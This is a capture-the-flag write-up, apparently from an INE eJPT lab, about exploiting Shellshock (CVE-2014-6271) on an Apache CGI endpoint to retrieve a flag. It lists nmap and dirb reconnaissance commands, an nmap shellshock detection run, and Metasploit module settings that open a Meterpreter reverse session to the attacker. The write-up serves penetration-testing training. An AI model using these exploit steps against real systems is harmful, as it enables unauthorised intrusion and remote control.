# :game_die: Host Network Penetration Testing System Host Based Attacks Ctf 2 Ejpt Ine 9C11F3

> **Original Source:** [Host Network Penetration Testing System Host Based Attacks Ctf 2 Ejpt Ine 9C11F3](https://infosecwriteups.com/host-network-penetration-testing-system-host-based-attacks-ctf-2-ejpt-ine-9c11f35cbcd6)
> **Platform:** infosecwriteups.com | **Category:** `MISC`

---

## Q. Check the root (‘/’) directory for a file that might hold the key to the first flag on target1.ine.local.


As usual, I started with an Nmap scan to identify the running services.


```
nmap -T5 -A target1.ine.local
```


*nmap results*


Only one port was open — port 80 running Apache httpd 2.4.6. I navigated to `http://target1.ine.local` and it automatically redirected to `/browser.cgi`.


*`[http://target1.ine.local](http://target1.ine.local)`*


That immediately clicked — a CGI file on Apache 2.4.6? This could be Shellshock.


I ran DIRB to enumerate the directories:


```
dirb http://target1.ine.local
```


*dirb result*


DIRB found a `/cgi-bin/` directory returning 403 Forbidden, and confirmed the `/browser.cgi` file. To verify the vulnerability, I ran Nmap's shellshock detection script directly against that path:


```
nmap -T5 -sV -p 80 --script http-shellshock \
--script-args uri=/browser.cgi target1.ine.local
```


The target was VULNERABLE to CVE-2014–6271 — the server was executing commands injected via HTTP headers.


I searched for a compatible Metasploit module for Apache 2.4.6 and loaded it up:


```
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set rhosts target1.ine.local
set lhost <your-ip>
set targeturi /browser.cgi
run
```


A Meterpreter session opened. I listed the contents of the root `/` directory:


```
meterpreter > ls /
```


*flag1*


Right there in the root — `flag.txt`.

---

*Originally published on [Medium](https://infosecwriteups.com/host-network-penetration-testing-system-host-based-attacks-ctf-2-ejpt-ine-9c11f35cbcd6). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
